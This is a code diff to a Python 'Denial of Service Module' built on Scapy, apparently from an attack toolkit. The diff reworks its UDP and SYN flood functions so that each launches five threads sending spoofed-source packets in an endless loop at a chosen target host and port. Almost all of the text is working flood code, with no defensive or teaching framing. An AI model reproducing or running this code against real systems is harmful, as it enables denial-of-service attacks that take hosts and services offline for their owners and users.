@@ -29,7 +29,7 @@ class Jam(object):
 
 	name = "Denial of Service Module."
 	desc = "Denial of service attacks here."
-	version = "0.5"
+	version = "0.6"
 	ps = "Need to add POST DoS attack."
 
 	def __init__(self):
@@ -59,30 +59,25 @@ class Jam(object):
 		self.dport = dport
 		try:
 			print "[+] UDP flood denial of service initialized on port: {}.".format(dport)
-			self.u = threading.Thread(name='udpflood',target=self.udpflood)
-			self.u.setDaemon(True)
-			self.u.start()
+			for i in range(0,5):
+				u = threading.Thread(name='udpflood',target=self.udpflood)
+				u.setDaemon(True)
+				u.start()
 		except Exception as e:
 			print "[!] Exception caught: {}".format(e)
 
 	def udpfloodstop(self):
-		self.udpstop = True
 		print "[-] UDP flood denial of service finalized."
+		exit(0)
 
 	def udpflood(self):
-		if self.udpstop == True:
-			try:
-				self.u.terinate()
-			except:
-				pass
-		else:
-			try:
-				IP_layer = IP(src=self.src, dst=self.tgt)
-				UDP_layer = UDP(sport=1337,dport=self.dport)
-				pkt = IP_layer/UDP_layer
-				send(pkt, loop=1, inter=0.0, verbose=False)
-			except:
-				print "[!] Error: check the parameters (target, interface, port)"
+		try:
+			IP_layer = IP(src=self.src, dst=self.tgt)
+			UDP_layer = UDP(sport=1337,dport=self.dport)
+			pkt = IP_layer/UDP_layer
+			send(pkt, loop=1, inter=0.0, verbose=False)
+		except:
+			print "[!] Error: check the parameters (target, interface, port)"
 
 	def synfloodstart(self, host, tgt, dport):
 		self.src = host
@@ -90,30 +85,25 @@ class Jam(object):
 		self.dport = dport
 		try:
 			print "[+] SYN flood denial of service initialized."
-			self.s = threading.Thread(name='synflood', target=self.synflood)
-			self.s.setDaemon(True)
-			self.s.start()
+			for i in range(0,5):
+				s = threading.Thread(name='synflood', target=self.synflood)
+				s.setDaemon(True)
+				s.start()
 		except Exception as e:
 			print "[!] Exception caught: {}".format(e)
 
 	def synfloodstop(self):
-		self.synstop = True
 		print "[-] SYN flood denial of service finalized."
+		exit(0)
 
 	def synflood(self):
-		if self.synstop == True:
-			try:
-				self.s.terminate()
-			except:
-				pass
-		else:
-			try:
-				IP_layer = IP(src=self.src, dst=self.tgt)
-				TCP_layer = TCP(sport=1337,dport=self.dport)
-				pkt = IP_layer/TCP_layer
-				send(pkt, loop=1, inter=0.0, verbose=False)
-			except:
-				print "[!] Error: check the parameters (target, interface, port)"
+		try:
+			IP_layer = IP(src=self.src, dst=self.tgt)
+			TCP_layer = TCP(sport=1337,dport=self.dport)
+			pkt = IP_layer/TCP_layer
+			send(pkt, loop=1, inter=0.0, verbose=False)
+		except:
+			print "[!] Error: check the parameters (target, interface, port)"
 
 	def callback(self, packet):
                 packet.drop()
